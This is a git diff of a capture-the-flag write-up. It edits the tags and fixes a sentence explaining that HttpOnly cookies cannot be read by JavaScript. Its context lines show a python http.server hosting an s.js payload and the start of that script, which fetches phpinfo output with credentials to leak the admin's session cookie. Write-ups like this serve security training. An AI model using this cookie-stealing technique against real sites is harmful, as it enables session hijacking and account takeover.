@@ -7,10 +7,9 @@ tags:
   - Cookie-HJ
   - SSRF
   - RFI
-  - RCE
   - Docker
   - Scripting
-  - Brute-Force
+  - Cracking
   - Sudo
 ---
 # Information
@@ -177,7 +176,7 @@ $ sudo python3 -m http.server 8000
 10.66.159.17 - - [24/Oct/2026 19:57:53] "GET /s.js HTTP/1.1" 404 -
 ```
 
-Cookies are protected using **HttpOnly**, so can use JavaScript to steal them. However, we can leak **admin's cookie** using `phpinfo()` output. So, we host the next `s.js` file to steal it:
+Cookies are protected using **HttpOnly**, so can't use JavaScript to steal them. However, we can leak **admin's cookie** using `phpinfo()` output. So, we host the next `s.js` file to steal it:
 
 ```javascript
 fetch('/harm/to/self/server_info.php', { credentials: 'include' })
